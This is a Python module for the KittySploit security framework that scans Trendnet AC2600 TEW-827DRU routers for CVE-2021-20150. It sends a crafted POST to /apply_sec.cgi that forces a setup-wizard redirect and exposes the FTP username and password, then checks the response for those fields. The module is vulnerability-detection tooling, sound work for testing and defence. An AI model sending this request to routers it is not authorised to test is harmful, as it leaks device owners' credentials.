#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Trendnet AC2600 TEW-827DRU version 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Trendnet AC2600 TEW-827DRU - Credentials Disclosure Detection',
        'description': 'Trendnet AC2600 TEW-827DRU version 2.08B01 improperly discloses information via redirection from the setup wizard. A user may view information as Admin by manually browsing to the setup wizard and forcing it to redirect to the desired page.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'disclosure', 'router', 'tenable', 'trendnet', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.tenable.com/security/research/tra-2021-54',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-20150',
        ],
        'cve': 'CVE-2021-20150',
    }

    def run(self):
        path = '/apply_sec.cgi'
        r = self.http_request(method='POST', path=path, allow_redirects=False, data='action=setup_wizard_cancel&html_response_page=ftpserver.asp&html_response_return_page=ftpserver.asp\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('ftp_username', 'ftp_password', 'ftp_permission', 'TEW-827DRU',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Trendnet AC2600 TEW-827DRU - Credentials Disclosure detected', path=path)
            return True
        return False

